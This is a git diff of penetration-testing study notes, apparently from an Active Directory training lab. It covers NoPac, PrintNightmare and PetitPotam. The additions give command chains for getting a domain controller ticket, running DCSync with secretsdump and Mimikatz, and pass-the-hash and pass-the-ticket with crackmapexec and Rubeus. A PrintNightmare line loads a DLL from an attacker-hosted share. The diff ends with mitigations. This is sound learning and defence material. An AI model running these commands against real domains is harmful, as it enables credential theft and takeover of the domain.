@@ -6,7 +6,7 @@ maxLevel: 3 # Include headings up to the specified level
 includeLinks: true # Make headings clickable
 debugInConsole: false # Print debug info in Obsidian console
 ```
-## NoPac (SamAccountName Spoofing)
+## NoPac (SamAccountName Spoofing) : Standard domain access
 **CVEs**: 
 - [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) : Bypass vulnerability with the Security Account Manager (SAM)
 - [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287) : Vulnerability with the Kerberos Privilege Attribute Certificate (PAC) in ADDS
@@ -31,7 +31,7 @@ This attack will leave the TGT on the attack host in the directory it was run. T
 
 This tool makes use of `smbexec.py` (*from Impacket*) which can be quite noisy and easily detected by Windows Defender (*and other AVs*).
 
-## PrintNightmare
+## PrintNightmare : Standard domain access
 **CVEs**:
 - [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) : Print spooler improperly performs privileged file operations, allowing RCE
 - [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) : Not publicly disclosed - Allows RCE
@@ -59,7 +59,7 @@ sudo smbserver.py -smb2support [share_name] [path_to_dll]
 sudo python3 CVE-2021-1675.py [domain]/[user]:[pass] '\\[ATK_host]\[share_name]\[filename].dll'
 ```
 
-## PetitPotam (MS-EFSRPC)
+## PetitPotam (MS-EFSRPC) : Unauthenticated
 **CVE**: 
 - [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) : Unauthenticated attacker can coerce the DC to authenticate against another server (LSA Spoofing)
 **Writeup**:
@@ -100,6 +100,42 @@ MIIS...CCJ8
 ```
 
 ### Requesting the TGT
+We request the TGT and then tell Kerberos to use the ccache file so our attack host can use it for authentication.
+```bash
+python3 /opt/PKINITtools/gettgtpkinit.py [DOMAIN]/[DC-NAME]\$ -pfx-base64 [b64-cert] [outputfile].ccache
+
+export KRB5CCNAME=[outputfile].ccache
 ```
-python3 /opt/PKINITtools/gettgtpkinit.py [DOMAIN]/[DC-NAME]\$ -pfx-base64 [b64-cert] [outputfile].
+
+### Using Domain Controller TGT to DCSync
+This attempts to perform a DCSync attack against the administrator account for the DC by using the TGT we have collected. The tool will automatically collect the username (the machine account's name) from the ccache file so we don't have to specify it here.
+```bash
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 ```
+
+### Authenticate as Administrator using PtH
+```bash
+crackmapexec smb [dc-ip] -u administrator -H [NT-hash]
+```
+
+### ALTERNATIVE - TGT request and PtT attack with [[Rubeus]]
+[[Rubeus]] lets us perform the entire process of requesting the TGT and performing a [[Password Attacks#Pass the Ticket with Rubeus|Pass the Ticket]] attack with the DC machine account
+```PowerShell
+.\Rubeus.exe asktgt /user:[DC-MACHINE-ACCOUNT] /certificate:[base64-cert] /ptt
+```
+We can then see all the tickets in memory with `klist`. Since the DC has replication privileges we can use the pass-the-ticket to perform a DCSync attack with [[Mimikatz]]. We could grab the NT hash for the KRBTGT account which would let us create a Golden Ticket and establish persistence.
+
+**DCSync with [[Mimikatz]]**
+```PowerShell
+.\mimikatz.exe
+
+lsadump::dcsync /user:[domain]\[target-user]
+```
+
+### Mitigations for PetitPotam
+- Apply patches for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) to any affected hosts
+- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrolment and Certificate Enrolment Web Service services
+- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
+- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
+- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrolment and Certificate Enrolment Web Service services are in use
+> This [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) demonstrates a number of attacks against AD CS that can be performed using authenticated API calls (*it also contains mitigations*). This demonstrates why its important to do other measures not just patching this one CVE.
